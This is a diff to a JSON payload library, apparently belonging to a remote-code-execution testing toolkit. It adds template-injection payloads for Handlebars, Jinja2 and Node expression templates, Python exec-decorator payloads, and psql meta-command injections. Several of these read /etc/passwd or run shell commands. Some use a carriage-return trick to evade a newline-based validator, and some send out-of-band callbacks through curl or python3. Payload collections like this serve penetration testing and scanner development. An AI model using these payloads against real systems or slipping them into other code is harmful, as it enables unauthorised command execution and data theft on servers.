@@ -93,6 +93,7 @@
                 ],
                 "handlebars_ssti": [
                     "{{7 * 7}}",
+                    "{{ {math} }}",
                     "{{lookup (lookup (lookup (lookup __proto__ 'constructor') 'constructor') 'call') 'whoami'}}",
                     "{{#with (lookup (lookup this '__proto__') 'constructor')}}{{#with (lookup this 'constructor')}}{{call this 'cat /etc/passwd'}}{{/with}}{{/with}}"
                 ],
@@ -104,6 +105,12 @@
                 "deserialization": [
                     "const serialize = require('node-serialize'); const payload = \"{\\\"rce\\\": \\\"_$$ND_FUNC$$_function(){require('child_process').exec('id');}()\\\"}\"; serialize.unserialize(payload);",
                     "const payload = \"{\\\"rce\\\":\\\"_$$ND_FUNC$$_function(){process.mainModule.require('child_process').exec('id');}()\\\"}\"; require('node-serialize').unserialize(payload);"
+                ],
+                "expression_template": [
+                    "{{ (function(){ return this.process.mainModule.require('child_process').execSync('id').toString() })() }}",
+                    "={{ (function(){ return this.process.mainModule.require('child_process').execSync('id').toString() })() }}",
+                    "{{ (function(){ return this.constructor.constructor('return process')().mainModule.require('child_process').execSync('cat /etc/passwd').toString() })() }}",
+                    "={{ $jmespath ? '' : (function(){ return this.process.mainModule.require('child_process').execSync('id').toString() })() }}"
                 ]
             },
             "python": {
@@ -121,11 +128,30 @@
                 ],
                 "jinja2_ssti": [
                     "{{7*7}}",
+                    "{{ {math} }}",
                     "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
                     "{{''.__class__.__mro__[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0].strip()}}",
                     "{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}",
                     "{{cycler.__init__.__globals__['os'].popen('whoami').read()}}",
                     "{{''.__class__.__mro__[2].__subclasses__()[40]('/bin/sh',shell=True,stdout=-1).communicate()}}"
+                ],
+                "exec_ast": [
+                    "@exec(\"raise Exception(__import__('subprocess').check_output(['id']))\")\ndef _(): pass",
+                    "@exec(\"raise Exception(open('/etc/passwd').read())\")\ndef _(): pass",
+                    "def _(a=exec(\"raise Exception(__import__('subprocess').check_output(['id']))\")): pass",
+                    "def _(a=exec(\"raise Exception(open('/etc/passwd').read())\")): pass",
+                    "def _(a=__import__('os').system('id')): pass"
+                ]
+            },
+            "postgres": {
+                "psql_meta_command": [
+                    "SELECT 1;\n\\! id\n",
+                    "SELECT 1;\n\\! cat /etc/passwd\n",
+                    {"payload": "SELECT 1;\r\\! id\r", "notes": ["CR (\\r) separates the meta-command so a newline-based validator (e.g. pgAdmin CVE-2025-13780) does not detect the \\! line"]},
+                    {"payload": "SELECT 1;\r\\! cat /etc/passwd\r", "notes": ["CR (\\r) meta-command bypass; psql still executes \\! after splitting on CR"]},
+                    {"payload": "SELECT 1;\r\\! bash -c 'id > /tmp/rcekit_{canary}'\r", "expected_channel": "response", "notes": ["blind sink: confirm out-of-band or via the written marker rather than the HTTP response"]},
+                    {"payload": "SELECT 1;\r\\! curl -s {callback}\r", "notes": ["blind async sink: {callback} is filled by the chain runner with the OOB listener URL; confirmation is the received callback, not the HTTP response"]},
+                    {"payload": "SELECT 1;\r\\! python3 -c 'import urllib.request;urllib.request.urlopen(\"{callback}\")'\r", "notes": ["blind async sink, curl-free OOB callback via python3; confirmed by the received callback"]}
                 ]
             },
             "php": {
